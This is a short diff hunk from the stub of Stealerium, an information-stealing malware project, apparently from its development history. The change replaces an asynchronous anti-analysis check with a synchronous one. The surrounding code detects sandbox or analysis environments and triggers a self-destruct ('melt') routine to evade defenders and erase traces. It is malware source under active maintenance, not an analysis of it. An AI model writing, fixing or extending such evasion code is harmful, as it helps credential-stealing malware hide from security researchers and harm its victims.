@@ -24,7 +24,7 @@ namespace Stealerium.Stub
             ServicePointManager.DefaultConnectionLimit = 9999;
 
             // Run AntiAnalysis modules first
-            if (await AntiAnalysis.RunAsync().ConfigureAwait(false))
+            if (AntiAnalysis.Run())
             {
                 Logging.Log("AntiAnalysis: Detected suspicious environment. Initiating self-destruct.");
                 SelfDestruct.Melt();
